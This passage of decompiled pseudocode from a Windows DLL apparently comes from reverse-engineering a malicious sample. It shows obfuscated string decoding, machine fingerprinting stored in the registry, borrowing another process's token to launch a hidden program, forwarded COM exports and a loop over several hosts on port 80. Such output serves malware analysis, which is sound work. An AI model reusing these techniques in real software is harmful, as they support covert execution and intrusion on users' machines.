                                                                    if ( sub_10004644(a2, a3, lpString, 0)
                                                                      && sub_10004644(a2, a3, String, 1) )
                                                                    {
                                                                      return 1;
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return v34;
}
// 10004799: variable 'v6' is possibly undefined
// 10004AAD: variable 'v29' is possibly undefined

//----- (10004B3D) --------------------------------------------------------
int __thiscall sub_10004B3D(void *this)
{
  int result; // eax
  DWORD v2; // [esp+0h] [ebp-4h] BYREF

  v2 = (DWORD)this;
  result = Val;
  if ( !Val )
  {
    memset(&v2, Val, sizeof(v2));
    if ( !sub_10005070(&v2) )
    {
      v2 = sub_10004BAE();
      sub_1000512C(v2);
    }
    result = v2;
    Val = v2;
  }
  return result;
}

//----- (10004B7F) --------------------------------------------------------
int __thiscall sub_10004B7F(void *this)
{
  int result; // eax
  int v2; // [esp+0h] [ebp-4h] BYREF

  v2 = (int)this;
  result = dword_1001569C;
  if ( !dword_1001569C )
  {
    memset(&v2, dword_1001569C, sizeof(v2));
    sub_100050CE(&v2);
    result = v2;
    dword_1001569C = v2;
  }
  return result;
}

//----- (10004BAE) --------------------------------------------------------
DWORD sub_10004BAE()
{
  int v0; // esi
  DWORD MaximumComponentLength; // [esp+4h] [ebp-Ch] BYREF
  DWORD FileSystemFlags; // [esp+8h] [ebp-8h] BYREF
  DWORD VolumeSerialNumber; // [esp+Ch] [ebp-4h] BYREF

  MaximumComponentLength = 0;
  FileSystemFlags = 0;
  VolumeSerialNumber = 0;
  if ( !GetVolumeInformationA(0, 0, 0, &VolumeSerialNumber, &MaximumComponentLength, &FileSystemFlags, 0, 0) )
    VolumeSerialNumber = 0;
  v0 = sub_1000C962();
  return VolumeSerialNumber ^ v0 ^ sub_10004D45();
}

//----- (10004BF2) --------------------------------------------------------
int __thiscall sub_10004BF2(int (__stdcall **this)(_DWORD))
{
  int result; // eax
  int v3; // eax
  int v4; // eax

  result = dword_10015674;
  if ( dword_1001567C == dword_10015674 )
  {
    v3 = sub_10008918((int)&unk_10014070);
    v4 = this[238](v3);
    if ( v4 == -1 || !sub_10004C3B((int)this, v4) || (result = dword_10015674, dword_10015674 == -1) )
    {
      result = dword_1001567C;
      dword_10015674 = dword_1001567C;
    }
  }
  return result;
}
// 10015674: using guessed type int dword_10015674;
// 1001567C: using guessed type int dword_1001567C;

//----- (10004C3B) --------------------------------------------------------
int __thiscall sub_10004C3B(int this, int a2)
{
  void *v3; // ebx
  int v4; // eax
  _DWORD *v5; // eax
  int v6; // eax
  int v8; // [esp+Ch] [ebp-Ch]
  int v9; // [esp+10h] [ebp-8h] BYREF
  size_t Size; // [esp+14h] [ebp-4h] BYREF

  v8 = 0;
  v9 = 0;
  Size = 0;
  if ( !(*(int (__stdcall **)(int, int *))(this + 932))(a2, &v9) )
  {
    Size = 640;
    v3 = malloc(0x280u);
    if ( v3 )
    {
      v4 = (*(int (__stdcall **)(void *, size_t *))(this + 936))(v3, &Size);
      if ( !v4 )
        goto LABEL_7;
      if ( v4 != 111 )
      {
LABEL_15:
        free(v3);
        return v8;
      }
      free(v3);
      v3 = malloc(Size);
      if ( v3 )
      {
        if ( !(*(int (__stdcall **)(void *, size_t *))(this + 936))(v3, &Size) )
        {
LABEL_7:
          v5 = v3;
          while ( v5[103] != v9 )
          {
            v5 = (_DWORD *)*v5;
            if ( !v5 )
              goto LABEL_15;
          }
          if ( v5 )
          {
            v6 = (*(int (__stdcall **)(_DWORD *))(this + 952))(v5 + 108);
            if ( v6 == -1 )
              v6 = dword_1001567C;
            dword_10015674 = v6;
            v8 = 1;
          }
          goto LABEL_15;
        }
        goto LABEL_15;
      }
    }
  }
  return v8;
}
// 10015674: using guessed type int dword_10015674;
// 1001567C: using guessed type int dword_1001567C;

//----- (10004D02) --------------------------------------------------------
char *sub_10004D02()
{
  DWORD nSize; // [esp+4h] [ebp-4h] BYREF

  if ( !strcmp(String2, Buffer) )
  {
    nSize = 16;
    if ( !GetComputerNameA(Buffer, &nSize) )
      lstrcpyA(Buffer, lpString2);
  }
  return Buffer;
}

//----- (10004D45) --------------------------------------------------------
int sub_10004D45()
{
  int v0; // ebp
  char *v1; // eax
  int v2; // ebx
  int i; // esi
  int v4; // eax

  v0 = 0;
  v1 = sub_10004D02();
  v2 = lstrlenA(v1);
  for ( i = 0; i < v2; v0 += v4 )
  {
    v4 = (i + 1) * sub_10004D02()[i];
    ++i;
  }
  return v0;
}

//----- (10004D7D) --------------------------------------------------------
int __stdcall sub_10004D7D(unsigned int a1, unsigned int a2)
{
  if ( a2 <= a1 )
    return a1 - a2;
  else
    return a1 - a2 - 1;
}

//----- (10004D95) --------------------------------------------------------
BOOL __stdcall sub_10004D95(unsigned int a1)
{
  return a1 < 0x800000;
}

//----- (10004DA4) --------------------------------------------------------
int __cdecl sub_10004DA4(void *a1)
{
  int Src[51]; // [esp+4h] [ebp-D0h] BYREF
  int v3; // [esp+D0h] [ebp-4h] BYREF

  memset(Src, 0, sizeof(Src));
  v3 = 0;
  if ( sub_1000B3FD(HKEY_LOCAL_MACHINE, lpSubKey, lpValueName, (LPBYTE)Src, 0xCCu, &v3)
    || v3 != 204
    || Src[3] != 6
    || Src[6] < 0x258u )
  {
    return 0;
  }
  memcpy(a1, Src, 0xCCu);
  return 1;
}

//----- (10004E27) --------------------------------------------------------
BOOL __cdecl sub_10004E27(BYTE Data)
{
  return sub_1000B4ED(HKEY_LOCAL_MACHINE, lpSubKey, lpValueName, &Data, 0xCCu, 3u) == 0;
}

//----- (10004E53) --------------------------------------------------------
BOOL sub_10004E53()
{
  return sub_1000B5AA(HKEY_LOCAL_MACHINE, lpSubKey, lpValueName);
}

//----- (10004E74) --------------------------------------------------------
int sub_10004E74()
{
  BSTR *v0; // ecx
  BSTR *v2[2]; // [esp-4h] [ebp-18h] BYREF
  __int16 v3[2]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  *(_DWORD *)v3 = 0;
  if ( sub_1000D691((int)&dword_10015608, 2u, (unsigned int *)v3) )
    return 1;
  v2[0] = v0;
  v2[1] = (BSTR *)v2;
  sub_10002101(v2, (&dword_10015608)[*(_DWORD *)v3]);
  v4 = -1;
  sub_10001F58(420, 2, 21, v3[0], (volatile LONG *)v2[0]);
  return 0;
}
// 10004EA2: variable 'v0' is possibly undefined

//----- (10004F7C) --------------------------------------------------------
int sub_10004F7C()
{
  return 1;
}

//----- (10004F80) --------------------------------------------------------
char __userpurge sub_10004F80@<al>(int a1@<ebp>, int a2, int a3)
{
  *(_DWORD *)(a1 - 4) = -1;
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(*(_DWORD *)(a1 - 40) + 8) + 24))(*(_DWORD *)(*(_DWORD *)(a1 - 40) + 8));
  return *(_BYTE *)(a1 - 28);
}
// 10004F80: could not find valid save-restore pair for ebx
// 10004F80: could not find valid save-restore pair for edi
// 10004F80: could not find valid save-restore pair for esi

//----- (10004FA6) --------------------------------------------------------
char __thiscall sub_10004FA6(int this, LPCSTR a2, void *Src, size_t Size)
{
  char result; // al
  BOOL v6; // eax
  int i; // esi
  char v8; // [esp+18h] [ebp-1Ch]

  v8 = 0;
  result = (*(int (__thiscall **)(_DWORD, _DWORD))(**(_DWORD **)(this + 8) + 20))(
             *(_DWORD *)(this + 8),
             *(_DWORD *)(this + 68));
  if ( result )
  {
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(this + 8) + 12))(*(_DWORD *)(this + 8)) )
    {
      v6 = 0;
      for ( i = 0; !v6 && i < 7; ++i )
        v6 = sub_10003B0A(this, *(&dword_10015788 + i), (int)(&dword_1001576C)[i], 80, a2, Src, Size, (CHAR *)4);
      if ( v6 )
        v8 = 1;
    }
    (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(this + 8) + 24))(*(_DWORD *)(this + 8));
    return v8;
  }
  return result;
}

//----- (10005070) --------------------------------------------------------
int __cdecl sub_10005070(void *a1)
{
  BYTE Src[4]; // [esp+0h] [ebp-8h] BYREF
  int v3; // [esp+4h] [ebp-4h] BYREF

  memset(Src, 0, sizeof(Src));
  v3 = 0;
  if ( sub_1000B3FD(HKEY_LOCAL_MACHINE, dword_10015758, dword_1001574C, Src, 4u, &v3) || v3 != 4 )
    return 0;
  memcpy(a1, Src, 4u);
  return 1;
}

//----- (100050CE) --------------------------------------------------------
int __cdecl sub_100050CE(void *a1)
{
  BYTE Src[4]; // [esp+0h] [ebp-8h] BYREF
  int v3; // [esp+4h] [ebp-4h] BYREF

  memset(Src, 0, sizeof(Src));
  v3 = 0;
  if ( sub_1000B3FD(HKEY_LOCAL_MACHINE, dword_10015754, dword_10015768, Src, 4u, &v3) || v3 != 4 )
    return 0;
  memcpy(a1, Src, 4u);
  return 1;
}

//----- (1000512C) --------------------------------------------------------
BOOL __cdecl sub_1000512C(BYTE Data)
{
  return sub_1000B4ED(HKEY_LOCAL_MACHINE, dword_10015758, dword_1001574C, &Data, 4u, 3u) == 0;
}

//----- (10005155) --------------------------------------------------------
int __thiscall sub_10005155(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 12))(this[2]);
}

//----- (10005162) --------------------------------------------------------
int sub_10005162()
{
  int result; // eax

  result = sub_10008918((int)&unk_10014098);
  dword_1001575C = result;
  return result;
}
// 1001575C: using guessed type int dword_1001575C;

//----- (10005178) --------------------------------------------------------
int sub_10005178()
{
  int result; // eax

  result = sub_10008918((int)&unk_100140B4);
  dword_10015750 = result;
  return result;
}
// 10015750: using guessed type int dword_10015750;

//----- (1000518E) --------------------------------------------------------
const CHAR *sub_1000518E()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_100140D0);
  dword_10015760 = result;
  return result;
}

//----- (100051A4) --------------------------------------------------------
int sub_100051A4()
{
  int result; // eax

  dword_1001576C = (LPCSTR)sub_10008918((int)&unk_100141D8);
  dword_10015770 = sub_10008918((int)&unk_100141AC);
  dword_10015774 = sub_10008918((int)&unk_10014180);
  dword_10015778 = sub_10008918((int)&unk_10014150);
  dword_1001577C = sub_10008918((int)&unk_10014120);
  dword_10015780 = sub_10008918((int)&unk_100140F4);
  result = sub_10008918((int)&unk_10014070);
  dword_10015784 = result;
  return result;
}
// 10015770: using guessed type int dword_10015770;
// 10015774: using guessed type int dword_10015774;
// 10015778: using guessed type int dword_10015778;
// 1001577C: using guessed type int dword_1001577C;
// 10015780: using guessed type int dword_10015780;
// 10015784: using guessed type int dword_10015784;

//----- (10005220) --------------------------------------------------------
int sub_10005220()
{
  int result; // eax

  dword_10015788 = sub_10008918((int)&unk_10014204);
  dword_1001578C = sub_10008918((int)&unk_10014204);
  dword_10015790 = sub_10008918((int)&unk_10014204);
  dword_10015794 = sub_10008918((int)&unk_10014204);
  dword_10015798 = sub_10008918((int)&unk_10014204);
  dword_1001579C = sub_10008918((int)&unk_10014204);
  result = sub_10008918((int)&unk_10014204);
  dword_100157A0 = result;
  return result;
}
// 1001578C: using guessed type int dword_1001578C;
// 10015790: using guessed type int dword_10015790;
// 10015794: using guessed type int dword_10015794;
// 10015798: using guessed type int dword_10015798;
// 1001579C: using guessed type int dword_1001579C;
// 100157A0: using guessed type int dword_100157A0;

//----- (1000527D) --------------------------------------------------------
const CHAR *sub_1000527D()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_10014230);
  lpSubKey = result;
  return result;
}

//----- (10005293) --------------------------------------------------------
const CHAR *sub_10005293()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_10014280);
  lpValueName = result;
  return result;
}

//----- (100052A9) --------------------------------------------------------
const CHAR *sub_100052A9()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_10014230);
  dword_10015758 = result;
  return result;
}

//----- (100052BF) --------------------------------------------------------
const CHAR *sub_100052BF()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_100142AC);
  dword_1001574C = result;
  return result;
}

//----- (100052D5) --------------------------------------------------------
const CHAR *sub_100052D5()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_100142D8);
  dword_10015754 = result;
  return result;
}

//----- (100052EB) --------------------------------------------------------
const CHAR *sub_100052EB()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_10014334);
  dword_10015768 = result;
  return result;
}

//----- (100052FC) --------------------------------------------------------
int __thiscall sub_100052FC(int this, int a2)
{
  sub_10001B09((_BYTE *)this, 1);
  *(_DWORD *)(this + 8) = a2;
  *(_DWORD *)this = off_100103B8;
  return this;
}
// 100103B8: using guessed type int (*off_100103B8[3])();

//----- (10005339) --------------------------------------------------------
int __thiscall sub_10005339(LPCSTR *this)
{
  int v1; // ebx
  const CHAR *v3; // eax
  HANDLE v4; // eax
  CHAR Dst[264]; // [esp+8h] [ebp-168h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+110h] [ebp-60h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+154h] [ebp-1Ch] BYREF
  HANDLE hObject; // [esp+164h] [ebp-Ch]
  HANDLE TokenHandle; // [esp+168h] [ebp-8h] BYREF
  DWORD dwProcessId; // [esp+16Ch] [ebp-4h] BYREF

  v1 = 0;
  dwProcessId = 0;
  v3 = (const CHAR *)sub_10008918((int)&unk_1001435C);
  if ( sub_1000CA68(v3, &dwProcessId, 0) )
    return 0;
  if ( !dwProcessId )
    return 0;
  v4 = OpenProcess(0x400u, 0, dwProcessId);
  hObject = v4;
  if ( !v4 )
    return 0;
  TokenHandle = 0;
  if ( OpenProcessToken(v4, 0xF01FFu, &TokenHandle) )
  {
    memset(Dst, 0, 0x105u);
    if ( ExpandEnvironmentStringsA(this[2], Dst, 0x105u) )
    {
      memset(&StartupInfo.lpReserved, 0, 0x40u);
      memset(&ProcessInformation, 0, sizeof(ProcessInformation));
      StartupInfo.cb = 68;
      if ( CreateProcessAsUserA(TokenHandle, Dst, 0, 0, 0, 0, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation) )
        v1 = 1;
    }
    CloseHandle(TokenHandle);
  }
  CloseHandle(hObject);
  return v1;
}

//----- (10005433) --------------------------------------------------------
_DWORD *__thiscall sub_10005433(_DWORD *this, char a2)
{
  sub_1000544F(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (1000544F) --------------------------------------------------------
void *__thiscall sub_1000544F(_DWORD *this)
{
  void *result; // eax

  result = &loc_1000F918;
  *this = off_100103B8;
  *this = off_1001029C;
  *this = &off_10010200;
  return result;
}
// 10010200: using guessed type void *off_10010200;
// 1001029C: using guessed type int (*off_1001029C[3])();
// 100103B8: using guessed type int (*off_100103B8[3])();

//----- (10005488) --------------------------------------------------------
const CHAR *sub_10005488()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_10014388);
  dword_100157A4 = result;
  return result;
}

//----- (10005499) --------------------------------------------------------
int __stdcall sub_10005499(HMODULE lpParameter, int a2, int a3)
{
  int result; // eax
  const CHAR *v4; // eax
  bool v5; // bl
  int v6; // eax
  int v7; // eax
  char pSecurityDescriptor[20]; // [esp+10h] [ebp-4Ch] BYREF
  struct _SECURITY_ATTRIBUTES EventAttributes; // [esp+24h] [ebp-38h] BYREF
  bool v10; // [esp+30h] [ebp-2Ch]
  DWORD v11[2]; // [esp+34h] [ebp-28h] BYREF
  int v12; // [esp+3Ch] [ebp-20h] BYREF
  DWORD ThreadId; // [esp+40h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+44h] [ebp-18h]

  v12 = 2;
  v11[0] = 0;
  ThreadId = 0;
  ms_exc.registration.TryLevel = 0;
  if ( !a2 )
  {
    sub_100071C5();
    if ( sub_10006EF0() )
    {
      if ( hObject )
      {
        ResetEvent(hObject);
        CloseHandle(hObject);
        hObject = 0;
      }
      if ( hHandle )
      {
        CloseHandle(hHandle);
        hHandle = 0;
      }
      sub_100064BC();
      return 1;
    }
    goto LABEL_19;
  }
  if ( a2 == 1 )
  {
    if ( a3 == 439611819 )
    {
      dword_100158DC = (int)CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, lpParameter, 0, &ThreadId);
      result = 1;
LABEL_15:
      ms_exc.registration.TryLevel = -1;
      return result;
    }
    hModule = lpParameter;
    sub_1000B246(pSecurityDescriptor);
    EventAttributes.nLength = 12;
    EventAttributes.lpSecurityDescriptor = pSecurityDescriptor;
    EventAttributes.bInheritHandle = 0;
    v4 = (const CHAR *)sub_10008918((int)&unk_100143B0);
    hHandle = CreateEventA(&EventAttributes, 1, 0, v4);
    v5 = !sub_10005675(&v12);
    v10 = v5;
    v6 = sub_10006DEB() - 1;
    if ( v6 )
    {
      v7 = v6 - 1;
      if ( v7 )
      {
        if ( v7 == 1 )
        {
          v5 = 1;
          v10 = 1;
        }
      }
      else if ( !v12 )
      {
        sub_10001EE5(420, 1, 20, 0);
        sub_10001421();
        result = 0;
        goto LABEL_15;
      }
      goto LABEL_9;
    }
    if ( v12 )
    {
LABEL_9:
      dword_100158E4 = (int)CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_10005F06, 0, 0, v11);
      if ( !dword_100158E4 )
      {
        v5 = 1;
        v10 = 1;
      }
      if ( v5 )
      {
        sub_10001EE5(420, 1, 16, 0);
        sub_10005BA5();
      }
      return 1;
    }
    sub_10001EE5(420, 1, 20, 0);
    sub_10001421();
LABEL_19:
    ms_exc.registration.TryLevel = -1;
    return 0;
  }
  return 1;
}
// 100158DC: using guessed type int dword_100158DC;
// 100158E4: using guessed type int dword_100158E4;
// 10005499: using guessed type DWORD var_28[2];

//----- (10005675) --------------------------------------------------------
bool __cdecl sub_10005675(int *a1)
{
  bool v1; // bl
  int v2; // eax
  int v3; // eax

  v1 = sub_10006431() != 0;
  v2 = sub_1000D3AF();
  v3 = sub_100065A7(v2);
  if ( v3 )
    v1 = 0;
  if ( a1 )
    *a1 = v3;
  return v1;
}

//----- (100056A3) --------------------------------------------------------
char sub_100056A3()
{
  return sub_10001222();
}

//----- (100056F4) --------------------------------------------------------
HRESULT __stdcall DllCanUnloadNow()
{
  if ( dword_100158C0 )
    return dword_100158C0();
  else
    return 1;
}
// 100158C0: using guessed type int (*dword_100158C0)(void);

//----- (10005750) --------------------------------------------------------
HRESULT __stdcall DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv)
{
  if ( dword_100158C4 )
    return dword_100158C4(rclsid, riid, ppv);
  else
    return -2147221231;
}
// 100158C4: using guessed type int (__stdcall *dword_100158C4)(_DWORD, _DWORD, _DWORD);

//----- (100057BB) --------------------------------------------------------
HRESULT __stdcall DllRegisterServer()
{
  if ( dword_100158C8 )
    return dword_100158C8();
  else
    return -2147418113;
}
// 100158C8: using guessed type int (*dword_100158C8)(void);

//----- (1000581B) --------------------------------------------------------
HRESULT __stdcall DllUnregisterServer()
{
  if ( dword_100158CC )
    return dword_100158CC();
  else
    return -2147418113;
}
// 100158CC: using guessed type int (*dword_100158CC)(void);

//----- (1000587B) --------------------------------------------------------
DWORD __stdcall sub_1000587B(LPVOID lpThreadParameter)
{
  char *v1; // eax
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  bool v6; // zf
  DWORD v7; // eax
  DWORD v8; // eax
  int v9; // eax
  int i; // [esp+Ch] [ebp-40h]
  HKEY hKey; // [esp+18h] [ebp-34h] BYREF
  HANDLE Handles; // [esp+1Ch] [ebp-30h] BYREF
  HANDLE EventA; // [esp+20h] [ebp-2Ch]
  HANDLE hEvent; // [esp+24h] [ebp-28h]
  int v15; // [esp+28h] [ebp-24h]
  bool v16; // [esp+2Ch] [ebp-20h]
  char v17; // [esp+30h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+34h] [ebp-18h]

  v17 = 1;
  hKey = 0;
  ms_exc.registration.TryLevel = 0;
  for ( i = 0; i < 3; ++i )
    *(&Handles + i) = 0;
  v1 = sub_10006398();
  hLibModule = LoadLibraryA(v1);
  v2 = (const CHAR *)sub_10008918((int)&unk_100133E0);
  Handles = CreateEventA(0, 1, 0, v2);
  if ( !Handles
    || (v3 = (const CHAR *)sub_10008918((int)&unk_100143B0), (EventA = CreateEventA(0, 1, 0, v3)) == 0)
    || (v4 = (const CHAR *)sub_10008918((int)&unk_100143DC), (hEvent = CreateEventA(0, 1, 0, v4)) == 0) )
  {
    sub_10001EE5(420, 1, 18, 0);
    sub_10001421();
    sub_10005B14((int)&Handles, hKey);
    ms_exc.registration.TryLevel = -1;
    return 1;
  }
  while ( v17 == 1 )
  {
    v6 = dword_100158BC == 2;
    if ( dword_100158BC >= 2 )
      goto LABEL_30;
    if ( hEvent )
      ResetEvent(hEvent);
    if ( sub_10005AA6(&hKey) && dword_10016024 )
      v15 = dword_10016024(hKey, 1, 5, hEvent, 1);
    v16 = sub_10006C73() != 0;
    v7 = WaitForMultipleObjects(3u, &Handles, 0, 0xFFFFFFFF);
    if ( v7 )
    {
      v8 = v7 - 1;
      if ( !v8 )
      {
        SetEvent(EventA);
        goto LABEL_27;
      }
      if ( v8 != 1 )
        goto LABEL_28;
      if ( hKey )
        RegCloseKey(hKey);
      if ( v16 )
      {
        v9 = sub_10006D11();
        if ( v9 == 2 )
        {
          SetEvent(EventA);
          sub_10001EE5(420, 1, 14, 0);
LABEL_27:
          sub_10001421();
          ResetEvent(EventA);
          goto LABEL_28;
        }
        if ( v9 != 1 )
          ++dword_100158BC;
      }
      else
      {
        v16 = sub_10006C73() != 0;
      }
    }
    else
    {
LABEL_28:
      v17 = 0;
    }
  }
  v6 = dword_100158BC == 2;
LABEL_30:
  if ( v6 )
  {
    sub_10001EE5(420, 1, 15, 0);
    SetEvent(EventA);
    sub_10001421();
    ResetEvent(EventA);
  }
  sub_10005B14((int)&Handles, hKey);
  return 0;
}
// 10016024: invalid function type has been ignored
// 100158BC: using guessed type int dword_100158BC;
// 10016024: using guessed type int (__stdcall *dword_10016024)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (10005AA6) --------------------------------------------------------
bool __cdecl sub_10005AA6(PHKEY phkResult)
{
  return RegOpenKeyExA(hKey, SubKey, 0, 0x10u, phkResult) == 0;
}

//----- (10005B14) --------------------------------------------------------
HMODULE __cdecl sub_10005B14(int a1, HKEY hKey)
{
  HANDLE *v2; // esi
  HMODULE result; // eax
  int i; // [esp+Ch] [ebp-1Ch]

  for ( i = 0; i < 3; ++i )
  {
    v2 = (HANDLE *)(a1 + 4 * i);
    if ( *v2 )
    {
      CloseHandle(*v2);
      *v2 = 0;
    }
  }
  if ( hKey )
    RegCloseKey(hKey);
  result = hLibModule;
  if ( hLibModule )
  {
    result = (HMODULE)FreeLibrary(hLibModule);
    hLibModule = 0;
  }
  return result;
}

//----- (10005BA5) --------------------------------------------------------
char sub_10005BA5()
{
  char v0; // bl

  v0 = 0;
  if ( hHandle )
  {
    SetEvent(hHandle);
    v0 = 1;
    CloseHandle(hHandle);
    hHandle = 0;
  }
  return v0;
}

//----- (10005C19) --------------------------------------------------------
int __stdcall StartAddress(LPVOID lpThreadParameter)
{
  const CHAR *v1; // eax
  const CHAR *v2; // eax
  _DWORD *v3; // ecx
  HANDLE *v4; // eax
  HANDLE *v5; // esi
  _BYTE *v6; // eax
  _BYTE *v7; // eax
  int v8; // esi
  char *v9; // eax
  const CHAR *v10; // eax
  void *v11; // esi
  _DWORD v13[13]; // [esp+4h] [ebp-57Ch] BYREF
  CHAR Dst[264]; // [esp+38h] [ebp-548h] BYREF
  _DWORD v15[9]; // [esp+140h] [ebp-440h] BYREF
  int v16[239]; // [esp+164h] [ebp-41Ch] BYREF
  char v17[20]; // [esp+520h] [ebp-60h] BYREF
  struct _SECURITY_ATTRIBUTES v18; // [esp+534h] [ebp-4Ch] BYREF
  char pSecurityDescriptor[20]; // [esp+540h] [ebp-40h] BYREF
  struct _SECURITY_ATTRIBUTES EventAttributes; // [esp+554h] [ebp-2Ch] BYREF
  HANDLE hObject; // [esp+560h] [ebp-20h]
  void *v22; // [esp+564h] [ebp-1Ch]
  void (__thiscall ***v23)(_DWORD, int); // [esp+568h] [ebp-18h]
  int v24; // [esp+56Ch] [ebp-14h]
  _DWORD *v25; // [esp+570h] [ebp-10h]
  int v26; // [esp+57Ch] [ebp-4h]

  v25 = v13;
  hObject = 0;
  v23 = 0;
  v22 = 0;
  v24 = 1;
  v26 = 0;
  if ( !sub_10005675(0) )
  {
    v24 = 1;
LABEL_7:
    LOBYTE(v26) = 5;
    goto LABEL_24;
  }
  sub_1000B246(pSecurityDescriptor);
  EventAttributes.nLength = 12;
  EventAttributes.lpSecurityDescriptor = pSecurityDescriptor;
  EventAttributes.bInheritHandle = 0;
  v1 = (const CHAR *)sub_10008918((int)&unk_100133B0);
  hObject = CreateEventA(&EventAttributes, 1, 0, v1);
  if ( !hObject )
  {
    v24 = 1;
    goto LABEL_7;
  }
  sub_1000B246(v17);
  v18.nLength = 12;
  v18.lpSecurityDescriptor = v17;
  v18.bInheritHandle = 0;
  v2 = (const CHAR *)sub_10008918((int)&unk_100143B0);
  hHandle = CreateEventA(&v18, 1, 0, v2);
  if ( !hHandle )
  {
    v24 = 1;
    goto LABEL_7;
  }
  v3 = operator new(0x20u);
  v13[11] = v3;
  LOBYTE(v26) = 1;
  if ( v3 )
    v4 = (HANDLE *)sub_1000D0E6(v3);
  else
    v4 = 0;
  v5 = v4;
  v13[12] = v4;
  LOBYTE(v26) = 0;
  v22 = v4;
  if ( v4 && !sub_1000D11A(v4) )
  {
    v13[9] = v5;
    v13[10] = v5;
    sub_1000D0FC(v5);
    operator delete(v5);
    v22 = 0;
  }
  v6 = operator new(8u);
  v13[7] = v6;
  LOBYTE(v26) = 2;
  if ( v6 )
    v7 = sub_1000EAA0(v6);
  else
    v7 = 0;
  v8 = (int)v7;
  v13[8] = v7;
  LOBYTE(v26) = 0;
  v23 = (void (__thiscall ***)(_DWORD, int))v7;
  if ( v7 && (*(unsigned __int8 (__thiscall **)(_BYTE *))(*(_DWORD *)v7 + 4))(v7) )
  {
    sub_1000651E(v16, v8, (int)v22, (int)hObject);
    LOBYTE(v26) = 3;
    if ( sub_1000264E(v16) )
    {
      v9 = sub_10006398();
      dword_100158D8 = LoadLibraryA(v9);
      memset(Dst, 0, 261);
      v10 = (const CHAR *)sub_10008918((int)&unk_1001440C);
      ExpandEnvironmentStringsA(v10, Dst, 0x105u);
      sub_1000C396(v15, (int)Dst, 1);
      LOBYTE(v26) = 4;
      sub_1000C3E9(v15);
      sub_10002E57(v16);
      if ( dword_100158D8 )
      {
        FreeLibrary(dword_100158D8);
        dword_100158D8 = 0;
      }
      v24 = 0;
      LOBYTE(v26) = 3;
      sub_1000C3E2(v15);
    }
    LOBYTE(v26) = 0;
    sub_1000657E(v16);
  }
LABEL_24:
  v26 = 6;
  if ( v23 )
  {
    v13[5] = v23;
    v13[6] = v23;
    (**v23)(v23, 1);
    v23 = 0;
  }
  v11 = v22;
  if ( v22 )
  {
    v13[3] = v22;
    v13[4] = v22;
    sub_1000D0FC((HANDLE *)v22);
    operator delete(v11);
    v22 = 0;
  }
  if ( hObject )
  {
    CloseHandle(hObject);
    hObject = 0;
  }
  if ( ::hObject )
  {
    ResetEvent(::hObject);
    CloseHandle(::hObject);
    ::hObject = 0;
  }
  if ( dword_100158D8 )
  {
    FreeLibrary(dword_100158D8);
    dword_100158D8 = 0;
  }
  return v24;
}
// 10005C19: using guessed type int var_41C[239];
// 10005C19: using guessed type _DWORD var_440[9];

//----- (10005F06) --------------------------------------------------------
BOOL __stdcall sub_10005F06(LPVOID lpThreadParameter)
{
  return sub_10005F64() != 1;
}

//----- (10005F64) --------------------------------------------------------
char sub_10005F64()
{
  const CHAR *v0; // eax
  HANDLE MutexA; // eax
  const CHAR *v2; // eax
  HANDLE EventA; // eax

  v0 = (const CHAR *)sub_10008918((int)&unk_10014444);
  MutexA = CreateMutexA(0, 0, v0);
  dword_10016028 = (int)MutexA;
  if ( MutexA )
  {
    if ( WaitForSingleObject(MutexA, 0x4E20u) )
    {
      sub_1000604A((HANDLE *)&dword_10016028);
    }
    else
    {
      if ( sub_10006102() != 2 )
      {
        v2 = (const CHAR *)sub_10008918((int)&unk_10013348);
        EventA = CreateEventA(0, 1, 0, v2);
        hObject = EventA;
        if ( EventA )
        {
          if ( SetEvent(EventA) )
          {
            sub_100060A2((HANDLE *)&dword_10016028);
            sub_10006F72();
            sub_10007030();
            return 1;
          }
        }
      }
      sub_100060A2((HANDLE *)&dword_10016028);
    }
  }
  return 0;
}
// 10016028: using guessed type int dword_10016028;

//----- (1000604A) --------------------------------------------------------
HANDLE __cdecl sub_1000604A(HANDLE *a1)
{
  HANDLE result; // eax

  result = *a1;
  if ( *a1 )
    result = (HANDLE)CloseHandle(*a1);
  *a1 = 0;
  return result;
}

//----- (100060A2) --------------------------------------------------------
HANDLE __cdecl sub_100060A2(HANDLE *a1)
{
  HANDLE result; // eax

  result = *a1;
  if ( *a1 )
  {
    ReleaseMutex(*a1);
    result = (HANDLE)CloseHandle(*a1);
  }
  *a1 = 0;
  return result;
}

//----- (10006102) --------------------------------------------------------
int sub_10006102()
{
  const CHAR *v1; // eax
  bool v2; // al

  if ( sub_1000619F() != 1 )
    return 2;
  sub_1000D3AF();
  if ( (sub_1000D3AF() & 0x1F) != 0 )
  {
    v2 = sub_1000CE78(byte_10015F10, 0);
  }
  else
  {
